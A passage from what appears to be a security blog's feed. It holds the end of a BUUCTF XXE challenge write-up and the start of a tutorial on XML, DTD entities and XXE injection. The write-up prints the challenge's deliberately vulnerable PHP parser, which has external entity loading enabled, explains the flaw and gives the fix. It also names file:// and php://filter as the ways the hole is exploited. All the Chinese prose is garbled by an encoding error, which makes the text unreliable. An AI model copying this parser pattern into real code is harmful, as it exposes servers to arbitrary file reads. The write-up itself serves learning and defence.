src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212211806278.png" alt="img"></p><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212211840968.png" alt="img"></p><p>ç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚</p><p>å¯ä»¥è¿›ä¸€æ­¥å°è¯•è¯»å–index.phpçš„æºä»£ç ï¼š</p><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212212016331.png" alt="img"></p><p>base64è§£ç åçš„å†…å®¹æ˜¯æœ¬å…³çš„æºä»£ç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'on'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span><span class="token operator">-&gt;</span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Your username: "</span><span class="token operator">.</span><span class="token variable">$payload</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>ä»£ç è§£æï¼š</p><ol><li><code>$xmlfile = file_get_contents('php://input');</code><ul><li>ä»æ ‡å‡†è¾“å…¥æµä¸­è¯»å–XMLæ•°æ®ã€‚<code>file_get_contents</code>å‡½æ•°ç”¨äºè¯»å–æ–‡ä»¶å†…å®¹ï¼Œè¿™é‡Œä½¿ç”¨<code>php://input</code>æ¥è·å–é€šè¿‡HTTP POSTè¯·æ±‚å‘é€çš„åŸå§‹XMLæ•°æ®ã€‚</li></ul></li><li><code>$dom = new DOMDocument();</code><ul><li>åˆ›å»ºä¸€ä¸ª<code>DOMDocument</code>å¯¹è±¡ï¼Œç”¨äºè§£æXMLæ•°æ®ã€‚</li></ul></li><li><code>$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</code><ul><li>ä½¿ç”¨<code>loadXML</code>æ–¹æ³•å°†è¯»å–åˆ°çš„XMLæ•°æ®åŠ è½½åˆ°<code>DOMDocument</code>å¯¹è±¡ä¸­ã€‚<code>LIBXML_NOENT</code>æ ‡å¿—è¡¨ç¤ºè§£ææ—¶ä¼šå°†å®ä½“å¼•ç”¨æ›¿æ¢ä¸ºå®ƒä»¬çš„å€¼ï¼Œ<code>LIBXML_DTDLOAD</code>æ ‡å¿—è¡¨ç¤ºåŠ è½½æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰ã€‚</li></ul></li><li><code>$info = simplexml_import_dom($dom);</code><ul><li>å°†<code>DOMDocument</code>å¯¹è±¡è½¬æ¢ä¸º<code>SimpleXMLElement</code>å¯¹è±¡ï¼Œä»¥ä¾¿æ›´æ–¹ä¾¿åœ°æ“ä½œXMLæ•°æ®ã€‚</li></ul></li><li><code>$payload = $info-&gt;username;</code><ul><li>ä»<code>SimpleXMLElement</code>å¯¹è±¡ä¸­æå–<code>username</code>å…ƒç´ çš„å€¼ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨å˜é‡<code>$payload</code>ä¸­ã€‚</li></ul></li></ol><p>è¿™æ®µä»£ç å­˜åœ¨ä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼š</p><ul><li><strong>å¯ç”¨å¤–éƒ¨å®ä½“åŠ è½½</strong>ï¼š<code>libxml_disable_entity_loader(false)</code>å…è®¸åŠ è½½å¤–éƒ¨å®ä½“ï¼Œè¿™å¯èƒ½å¯¼è‡´XMLå¤–éƒ¨å®ä½“ï¼ˆXXEï¼‰æ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„XMLæ•°æ®æ¥è¯»å–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶æˆ–å‘èµ·å…¶ä»–æ¶æ„è¡Œä¸ºã€‚</li></ul><p>æ”¹è¿›å»ºè®®</p><ul><li>ç¦ç”¨å¤–éƒ¨å®ä½“åŠ è½½ï¼š</li></ul><pre class="line-numbers language-none"><code class="language-none">libxml_disable_entity_loader(true);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h1 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h1><p>æœ¬å…³ä¸»è¦è€ƒå¯ŸXXEæ¼æ´ï¼Œè€ƒç‚¹åŒ…æ‹¬ï¼š1ï¼‰XXEæ¼æ´è¯»å–æ•æ„Ÿæ–‡ä»¶ã€‚2ï¼‰<code>file://</code>å’Œ<code>php://filter/read</code>åè®®çš„åˆ©ç”¨ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTFå®æˆ˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> XXE </tag>
            
            <tag> CTFå®æˆ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XMLå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´(XXE)</title>
      <link href="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/"/>
      <url>/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€XMLå’ŒJSONæ•°æ®æ ¼å¼"><a href="#ä¸€ã€XMLå’ŒJSONæ•°æ®æ ¼å¼" class="headerlink" title="ä¸€ã€XMLå’ŒJSONæ•°æ®æ ¼å¼"></a>ä¸€ã€XMLå’ŒJSONæ•°æ®æ ¼å¼</h1><h2 id="1-1-ç®€ä»‹"><a href="#1-1-ç®€ä»‹" class="headerlink" title="1.1 ç®€ä»‹"></a>1.1 ç®€ä»‹</h2><p>XMLå’ŒJSONéƒ½æ˜¯webå­˜å‚¨å’Œä¼ è¾“è¿‡ç¨‹ä¸­æ•°æ®çš„æ ¼å¼ï¼Œå…¶ä¸­JSON ä½¿ç”¨æ¯”è¾ƒå¹¿æ³›ï¼Œä¸»è¦ç”¨æ¥å‰åç«¯äº¤äº’æ•°æ®ã€‚</p><h2 id="1-2-XML"><a href="#1-2-XML" class="headerlink" title="1.2 XML"></a>1.2 XML</h2><h3 id="1-2-1-XMLç®€ä»‹"><a href="#1-2-1-XMLç®€ä»‹" class="headerlink" title="1.2.1 XMLç®€ä»‹"></a>1.2.1 XMLç®€ä»‹</h3><p>XML(Extensible Markup Language)æ‰©å±•æ ‡è®°è¯­è¨€ ï¼Œæ˜¯ä¸€ç§å¸¸ç”¨çš„æ ‡è®°è¯­è¨€ï¼Œç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§ï¼Œå¯ä»¥ç”¨æ¥æ ‡è®°æ•°æ®ã€å®šä¹‰æ•°æ®ç±»å‹ï¼Œæ˜¯ä¸€ç§å…è®¸ç”¨æˆ·å¯¹è‡ªå·±çš„æ ‡è®°è¯­è¨€è¿›è¡Œå®šä¹‰çš„æºè¯­è¨€ã€‚ XMLä½¿ç”¨ DTD(document type definition)æ–‡æ¡£ç±»å‹å®šä¹‰æ¥ç»„ç»‡æ•°æ®ï¼›æ ¼å¼ç»Ÿä¸€ï¼Œè·¨å¹³å°å’Œè¯­è¨€ï¼Œæ—©å·²æˆä¸ºä¸šç•Œå…¬è®¤çš„æ ‡å‡†ã€‚XMLæ˜¯æ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€ (SGML) çš„å­é›†ï¼Œéå¸¸é€‚åˆ Web ä¼ è¾“ã€‚XML æä¾›ç»Ÿä¸€çš„æ–¹æ³•æ¥æè¿°å’Œäº¤æ¢ç‹¬ç«‹äºåº”ç”¨ç¨‹åºæˆ–ä¾›åº”å•†çš„ç»“æ„åŒ–æ•°æ®ã€‚</p><p>ä¾‹å­ï¼š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212151539830.png" style="zoom:80%;"><h3 id="1-2-2-XMLæ–‡æ¡£çš„æ„å»ºæ¨¡å—"><a href="#1-2-2-XMLæ–‡æ¡£çš„æ„å»ºæ¨¡å—" class="headerlink" title="1.2.2 XMLæ–‡æ¡£çš„æ„å»ºæ¨¡å—"></a>1.2.2 XMLæ–‡æ¡£çš„æ„å»ºæ¨¡å—</h3><h4 id="1ï¼‰å…ƒç´ "><a href="#1ï¼‰å…ƒç´ " class="headerlink" title="1ï¼‰å…ƒç´ "></a>1ï¼‰å…ƒç´ </h4><p>å…ƒç´ æ˜¯ XML ä»¥åŠ HTML æ–‡æ¡£çš„ä¸»è¦æ„å»ºæ¨¡å—ï¼Œå…ƒç´ å¯åŒ…å«ã€æ–‡æœ¬ã€å…¶ä»–å…ƒç´ æˆ–è€…æ˜¯ç©ºçš„ã€‘ã€‚</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212151710364.png" style="zoom:80%;"><p>ç©ºçš„ HTML å…ƒç´ çš„ä¾‹å­æ˜¯ <code>&lt;hr&gt;</code>ã€<code>&lt;br&gt;</code> ä»¥åŠ <code>&lt;img&gt;</code>ã€‚</p><h4 id="2ï¼‰å±æ€§"><a href="#2ï¼‰å±æ€§" class="headerlink" title="2ï¼‰å±æ€§"></a>2ï¼‰å±æ€§</h4><p>å±æ€§å¯æä¾›æœ‰å…³å…ƒç´ çš„é¢å¤–ä¿¡æ¯ï¼š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212152922852.png" style="zoom:80%;"><h4 id="3ï¼‰å®ä½“"><a href="#3ï¼‰å®ä½“" class="headerlink" title="3ï¼‰å®ä½“"></a>3ï¼‰å®ä½“</h4><p>å®ä½“æ˜¯ç”¨æ¥<code>å®šä¹‰æ™®é€šæ–‡æœ¬çš„å˜é‡</code>ã€‚</p><p>å®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚</p><h4 id="4ï¼‰PCDATA"><a href="#4ï¼‰PCDATA" class="headerlink" title="4ï¼‰PCDATA"></a>4ï¼‰PCDATA</h4><p>PCDATA çš„æ„æ€æ˜¯è¢«è§£æçš„å­—ç¬¦æ•°æ®<code>ï¼ˆparsed character dataï¼‰</code>ã€‚PCDATA æ˜¯ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚è¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°ã€‚</p><p>å½“æŸä¸ª XML å…ƒç´ è¢«è§£ææ—¶ï¼Œå…¶æ ‡ç­¾ä¹‹é—´çš„æ–‡æœ¬ä¹Ÿä¼šè¢«è§£æï¼š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212153053875.png" style="zoom:50%;"><p>è§£æå™¨ä¹‹æ‰€ä»¥è¿™ä¹ˆåšæ˜¯å› ä¸º XML å…ƒç´ å¯åŒ…å«å…¶ä»–å…ƒç´ ï¼Œå°±åƒè¿™ä¸ªä¾‹å­ä¸­ï¼Œå…¶ä¸­çš„<code> &lt;name&gt;</code>å…ƒç´ åŒ…å«ç€å¦å¤–çš„ä¸¤ä¸ªå…ƒç´ (first å’Œ last)ï¼š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212153144948.png" style="zoom:70%;"><h4 id="5ï¼‰CDATA"><a href="#5ï¼‰CDATA" class="headerlink" title="5ï¼‰CDATA"></a>5ï¼‰CDATA</h4><p>CDATA çš„æ„æ€æ˜¯å­—ç¬¦æ•°æ®ï¼ˆcharacter dataï¼‰ï¼ŒCDATA æ˜¯ä¸ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ã€‚</p><p>æœ¯è¯­ CDATA æŒ‡çš„æ˜¯ä¸åº”ç”± XML è§£æå™¨è¿›è¡Œè§£æçš„æ–‡æœ¬æ•°æ®ï¼ˆUnparsed Character Dataï¼‰ã€‚</p><p>åœ¨ XML å…ƒç´ ä¸­ï¼Œâ€&lt;â€ å’Œ â€œ&amp;â€ æ˜¯éæ³•çš„ã€‚â€&lt;â€ ä¼šäº§ç”Ÿé”™è¯¯ï¼Œå› ä¸ºè§£æå™¨ä¼šæŠŠè¯¥å­—ç¬¦è§£é‡Šä¸ºæ–°å…ƒç´ çš„å¼€å§‹ã€‚â€&amp;â€ ä¹Ÿä¼šäº§ç”Ÿé”™è¯¯ï¼Œå› ä¸ºè§£æå™¨ä¼šæŠŠè¯¥å­—ç¬¦è§£é‡Šä¸ºå­—ç¬¦å®ä½“çš„å¼€å§‹ã€‚æŸäº›æ–‡æœ¬ï¼Œæ¯”å¦‚ JavaScript ä»£ç ï¼ŒåŒ…å«å¤§é‡ â€œ&lt;â€ æˆ– â€œ&amp;â€ å­—ç¬¦ã€‚ä¸ºäº†é¿å…é”™è¯¯ï¼Œå¯ä»¥å°†è„šæœ¬ä»£ç å®šä¹‰ä¸º CDATAã€‚CDATA éƒ¨åˆ†ä¸­çš„æ‰€æœ‰å†…å®¹éƒ½ä¼šè¢«è§£æå™¨å¿½ç•¥ã€‚</p><p>CDATA éƒ¨åˆ†ç”± <code>&lt;![CDATA[</code> å¼€å§‹ï¼Œç”± <code>]]&gt;</code> ç»“æŸï¼š</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212153350612.png" style="zoom:80%;"><p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œè§£æå™¨ä¼šå¿½ç•¥ CDATA éƒ¨åˆ†ä¸­çš„æ‰€æœ‰å†…å®¹ã€‚</p><p>âš ï¸ï¼šCDATA éƒ¨åˆ†ä¸èƒ½åŒ…å«å­—ç¬¦ä¸² <code>]]&gt;</code>ã€‚ä¹Ÿä¸å…è®¸åµŒå¥—çš„ CDATA éƒ¨åˆ†ã€‚æ ‡è®° CDATA éƒ¨åˆ†ç»“å°¾çš„ <code>]]&gt;</code> ä¸èƒ½åŒ…å«ç©ºæ ¼æˆ–æŠ˜è¡Œã€‚</p><h3 id="1-2-3-DTD-æ–‡æ¡£ç±»å‹å®šä¹‰"><a href="#1-2-3-DTD-æ–‡æ¡£ç±»å‹å®šä¹‰" class="headerlink" title="1.2.3 DTD(æ–‡æ¡£ç±»å‹å®šä¹‰)"></a>1.2.3 DTD(æ–‡æ¡£ç±»å‹å®šä¹‰)</h3><p>ä½œç”¨ï¼šDTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTD å¯ä»¥åœ¨ XML æ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚</p><p>åˆ†ç±»ï¼š</p><ul><li>å†…éƒ¨å£°æ˜</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span>   <span class="token name">æ ¹å…ƒç´ </span>   <span class="token punctuation">[</span><span class="token name">å…ƒç´ å£°æ˜</span><span class="token punctuation">]</span>  <span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212153622196.png" style="zoom:87%;"><ul><li>å¤–éƒ¨å£°æ˜( å¼•ç”¨å¤–éƒ¨DTD )</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE æ ¹å…ƒç´  SYSTEM <span class="token string">"æ–‡ä»¶å"</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212153732754.png" style="zoom:77%;"><h3 id="1-2-4-DTDå®ä½“"><a href="#1-2-4-DTDå®ä½“" class="headerlink" title="1.2.4 DTDå®ä½“"></a>1.2.4 DTDå®ä½“</h3><h4 id="1ï¼‰ä½œç”¨"><a href="#1ï¼‰ä½œç”¨" class="headerlink" title="1ï¼‰ä½œç”¨"></a>1ï¼‰ä½œç”¨</h4><p>DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯åˆ†ä¸ºå†…éƒ¨å®ä½“å’Œå¤–éƒ¨å®ä½“ã€‚</p><h4 id="2ï¼‰åˆ†ç±»"><a href="#2ï¼‰åˆ†ç±»" class="headerlink" title="2ï¼‰åˆ†ç±»"></a>2ï¼‰åˆ†ç±»</h4><ul><li>å†…éƒ¨å®ä½“</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span>  <span class="token attr-name">å®ä½“å</span>  <span class="token attr-name">å®ä½“çš„å€¼</span> <span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ï¼ˆ1ï¼‰ä¸€èˆ¬å®ä½“ï¼š</p><p>ä¸€èˆ¬å®ä½“çš„å£°æ˜è¯­æ³•ï¼š<code>&lt;!ENTITY  å®ä½“å   "å®ä½“å†…å®¹"&gt;</code></p><p>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š<code>&amp;å®ä½“åï¼›</code></p><p>ï¼ˆ2ï¼‰å‚æ•°å®ä½“ï¼š</p><p>å‚æ•°å®ä½“çš„å£°æ˜æ ¼å¼ï¼š <code>&lt;!ENTITY  % å®ä½“å   "å®ä½“å†…å®¹"&gt;</code></p><p>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š<code>%å®ä½“åï¼›</code></p><p>å‚æ•°å®ä½“è¿˜èƒ½åµŒå¥—å®šä¹‰ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå†…å±‚çš„å®šä¹‰çš„å‚æ•°å®ä½“% éœ€è¦è¿›è¡ŒHTMLè½¬ä¹‰ï¼Œå¦åˆ™ä¼šå‡ºç°è§£æé”™è¯¯ã€‚</p><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212154341829.png" style="zoom:70%;"><ul><li>å¤–éƒ¨å®ä½“</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span>  <span class="token attr-name">å®ä½“å</span>  <span class="token attr-name">SYSTEM</span>   <span class="token attr-name">url</span>  <span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¹Ÿåˆ†ä¸ºä¸€èˆ¬å®ä½“å’Œå‚æ•°å®ä½“ã€‚</p><h4 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212154059288.png" style="zoom:80%;"><h2 id="1-3-JSON"><a href="#1-3-JSON" class="headerlink" title="1.3 JSON"></a>1.3 JSON</h2><p>æœ¬ç«™ã€Šè½»é‡çº§çš„æ•°æ®äº¤æ¢æ ¼å¼JSONã€‹<a href="https://sxksec.cn/2022/01/09/qian-hou-duan-kai-fa/qing-liang-ji-de-shu-ju-jiao-huan-ge-shi-json/">https://sxksec.cn/2022/01/09/qian-hou-duan-kai-fa/qing-liang-ji-de-shu-ju-jiao-huan-ge-shi-json/</a> ä¸€æ–‡ä¹Ÿæœ‰ç›¸å…³ä»‹ç»ã€‚</p><h3 id="1-3-1-ç®€ä»‹"><a href="#1-3-1-ç®€ä»‹" class="headerlink" title="1.3.1 ç®€ä»‹"></a>1.3.1 ç®€ä»‹</h3><p>JSONå…¨ç§°JavaScariptå¯¹è±¡è¡¨ç¤ºæ³•(JavaScript Object Notation)ï¼Œæ˜¯å­˜å‚¨å’Œäº¤æ¢æ–‡æœ¬ä¿¡æ¯çš„è¯­æ³•ã€‚å…·æœ‰æ–‡æœ¬é‡æ›´å°ã€æ›´å¿«å’Œæ›´æ˜“è§£æçš„ç‰¹ç‚¹ã€‚Jsonå’ŒHTMLä¸ä¸€æ ·ï¼ŒHTMLä¸»è¦ç”¨äºæ˜¾ç¤ºæ•°æ®ï¼ŒJSONä¸»è¦ç”¨äºä¼ é€’æ•°æ®ï¼Œæ‰€ä»¥ä¸€èˆ¬ä½œä¸ºæ•°æ®çš„æŸ¥è¯¢æ¥å£ã€‚</p><p>åœ¨ JS è¯­è¨€ä¸­ï¼Œä¸€åˆ‡éƒ½æ˜¯å¯¹è±¡ã€‚å› æ­¤ï¼Œä»»ä½•æ”¯æŒçš„ç±»å‹éƒ½å¯ä»¥é€šè¿‡ JSON æ¥è¡¨ç¤ºï¼Œä¾‹å¦‚å­—ç¬¦ä¸²ã€æ•°å­—ã€å¯¹è±¡ã€æ•°ç»„ç­‰ã€‚å¯¹è±¡å’Œæ•°ç»„æ˜¯æ¯”è¾ƒç‰¹æ®Šä¸”å¸¸ç”¨çš„ä¸¤ç§ç±»å‹ã€‚</p><h3 id="1-3-2-è¡¨ç¤ºæ ¼å¼"><a href="#1-3-2-è¡¨ç¤ºæ ¼å¼" class="headerlink" title="1.3.2 è¡¨ç¤ºæ ¼å¼"></a>1.3.2 è¡¨ç¤ºæ ¼å¼</h3><ul><li>å¯¹è±¡è¡¨ç¤ºä¸ºé”®å€¼å¯¹</li><li>æ•°æ®ç”±é€—å·åˆ†éš”</li><li>èŠ±æ‹¬å·ä¿å­˜å¯¹è±¡</li><li>æ–¹æ‹¬å·ä¿å­˜æ•°ç»„</li></ul><h3 id="1-3-3-JSONé”®å€¼å¯¹è¡¨"><a href="#1-3-3-JSONé”®å€¼å¯¹è¡¨" class="headerlink" title="1.3.3 JSONé”®å€¼å¯¹è¡¨"></a>1.3.3 JSONé”®å€¼å¯¹è¡¨</h3><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212155447991.png" style="zoom:80%;"><h3 id="1-3-4-JSONæ•°ç»„"><a href="#1-3-4-JSONæ•°ç»„" class="headerlink" title="1.3.4 JSONæ•°ç»„"></a>1.3.4 JSONæ•°ç»„</h3><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212155531213.png" style="zoom:80%;"><img src="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/image-20250212155540211.png" style="zoom:80%;"><h3 id="1-3-5-ä½¿ç”¨pythonè§£æJSONæ•°æ®"><a href="#1-3-5-ä½¿ç”¨pythonè§£æJSONæ•°æ®" class="headerlink" title="1.3.5 ä½¿ç”¨pythonè§£æJSONæ•°æ®"></a>1.3.5 ä½¿ç”¨pythonè§£æJSONæ•°æ®</h3><p>load()å’Œdump()æ–¹æ³•ã€‚</p><p>XMLå’ŒJSONçš„åŒºåˆ«</p><h2 id="1-4-XMLå’ŒJSONçš„åŒºåˆ«"><a href="#1-4-XMLå’ŒJSONçš„åŒºåˆ«" class="headerlink" title="1.4 XMLå’ŒJSONçš„åŒºåˆ«"></a>1.4 XMLå’ŒJSONçš„åŒºåˆ«</h2><h3 id="1-4-1-XMLçš„ä¼˜ç¼ºç‚¹"><a href="#1-4-1-XMLçš„ä¼˜ç¼ºç‚¹" class="headerlink" title="1.4.1 XMLçš„ä¼˜ç¼ºç‚¹"></a>1.4.1 XMLçš„ä¼˜ç¼ºç‚¹</h3><p>XMLçš„ä¼˜ç‚¹ï¼š</p><ul><li><p>æ ¼å¼ç»Ÿä¸€ï¼Œç¬¦åˆæ ‡å‡†ï¼›</p></li><li><p>å®¹æ˜“ä¸å…¶ä»–ç³»ç»Ÿè¿›è¡Œè¿œç¨‹äº¤äº’ï¼Œæ•°æ®å…±äº«æ¯”è¾ƒæ–¹ä¾¿ã€‚</p></li></ul><p>XMLçš„ç¼ºç‚¹ï¼š</p><ul><li><p>XMLæ–‡ä»¶åºå¤§ï¼Œæ–‡ä»¶æ ¼å¼å¤æ‚ï¼Œä¼ è¾“å å¸¦å®½ï¼›</p></li><li><p>æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯éƒ½éœ€è¦èŠ±è´¹å¤§é‡ä»£ç æ¥è§£æXMLï¼Œå¯¼è‡´æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯ä»£ç å˜å¾—å¼‚å¸¸å¤æ‚ä¸”ä¸æ˜“ç»´æŠ¤ï¼›</p></li><li><p>å®¢æˆ·ç«¯ä¸åŒæµè§ˆå™¨ä¹‹é—´è§£æXMLçš„æ–¹å¼ä¸ä¸€è‡´ï¼Œéœ€è¦é‡å¤ç¼–å†™å¾ˆå¤šä»£ç ï¼›</p></li><li><p>æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯è§£æXMLèŠ±è´¹è¾ƒå¤šçš„èµ„æºå’Œæ—¶é—´ã€‚</p></li></ul><h3 id="1-4-2-JSONçš„ä¼˜ç¼ºç‚¹"><a href="#1-4-2-JSONçš„ä¼˜ç¼ºç‚¹" class="headerlink" title="1.4.2 JSONçš„ä¼˜ç¼ºç‚¹"></a>1.4.2 JSONçš„ä¼˜ç¼ºç‚¹</h3><p>JSONçš„ä¼˜ç‚¹ï¼š</p><ul><li>æ•°æ®æ ¼å¼æ¯”è¾ƒç®€å•ï¼Œæ˜“äºè¯»å†™ï¼Œæ ¼å¼éƒ½æ˜¯å‹ç¼©çš„ï¼Œå ç”¨å¸¦å®½å°ï¼›</li><li>æ˜“äºè§£æï¼Œå®¢æˆ·ç«¯JavaScriptå¯ä»¥ç®€å•çš„é€šè¿‡eval()è¿›è¡ŒJSONæ•°æ®çš„è¯»å–ï¼›</li><li>æ”¯æŒå¤šç§è¯­è¨€ï¼ŒåŒ…æ‹¬ActionScript, C, C#, ColdFusion, Java, JavaScript, Perl, PHP, Python, Rubyç­‰æœåŠ¡å™¨ç«¯è¯­è¨€ï¼Œä¾¿äºæœåŠ¡å™¨ç«¯çš„è§£æï¼›</li><li>åœ¨PHPä¸–ç•Œï¼Œå·²ç»æœ‰PHP-JSONå’ŒJSON-PHPå‡ºç°äº†ï¼ŒåäºPHPåºåˆ—åŒ–åçš„ç¨‹åºç›´æ¥è°ƒç”¨ï¼ŒPHPæœåŠ¡å™¨ç«¯çš„å¯¹è±¡ã€æ•°ç»„ç­‰èƒ½ç›´æ¥ç”ŸæˆJSONæ ¼å¼ï¼Œä¾¿äºå®¢æˆ·ç«¯çš„è®¿é—®æå–ï¼›</li><li>å› ä¸ºJSONæ ¼å¼èƒ½ç›´æ¥ä¸ºæœåŠ¡å™¨ç«¯ä»£ç ä½¿ç”¨ï¼Œå¤§å¤§ç®€åŒ–äº†æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯çš„ä»£ç å¼€å‘é‡ï¼Œä¸”å®Œæˆä»»åŠ¡ä¸å˜ï¼Œå¹¶ä¸”æ˜“äºç»´æŠ¤ã€‚</li></ul><p>JSONçš„ç¼ºç‚¹ï¼š</p><ul><li>æ²¡æœ‰XMLæ ¼å¼è¿™ä¹ˆæ¨å¹¿çš„æ·±å…¥äººå¿ƒå’Œå–œç”¨å¹¿æ³›ï¼Œæ²¡æœ‰XMLé€šç”¨æ€§å¼ºã€‚</li></ul><h1 id="äºŒã€XXEæ¼æ´æ¦‚è¿°"><a href="#äºŒã€XXEæ¼æ´æ¦‚è¿°" class="headerlink" title="äºŒã€XXEæ¼æ´æ¦‚è¿°"></a>äºŒã€XXEæ¼æ´æ¦‚è¿°</h1><p>XML å¤–éƒ¨å®ä½“æ³¨å…¥ï¼ˆä¹Ÿç§°ä¸º XXEï¼‰æ˜¯ä¸€ä¸ª Web 